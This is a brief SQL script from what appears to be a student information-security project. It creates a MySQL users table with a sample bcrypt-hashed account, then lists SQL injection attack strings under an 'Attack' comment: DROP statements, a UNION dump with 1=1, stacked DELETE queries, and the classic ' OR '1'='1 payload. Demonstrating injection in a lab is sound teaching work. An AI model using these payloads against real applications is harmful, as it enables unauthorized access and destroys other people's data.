-- These are the query used in our project

mysql -u root -p

CREATE DATABASE information_security_project;

USE information_security_project;

CREATE TABLE users ( id smallint not null auto_increment, username varchar(20) not null, hashed_password varchar(255) not null, email varchar(50) not null, constraint pk_users primary key (id) );
INSERT INTO users (id, username, hashed_password, email) VALUES (3, 'horimz', '$2y$10$vP938eU2xD6t/uMOEUANIO4zSSxB7IzneMadVUl/k98RkktuYpuo6', 'dparkjm@horimz.com');

-- Attack
DROP TABLE users;
DROP DATABASE information_security_project;

SELECT * FROM users WHERE username='' 
UNION
SELECT * FROM users WHERE 1=1;

DELETE FROM users WHERE username='admin';

SELECT * FROM users WHERE username=''; DELETE FROM users WHERE username='admin';




' OR '1'='1
'; DELETE FROM users WHERE username='hanhoon';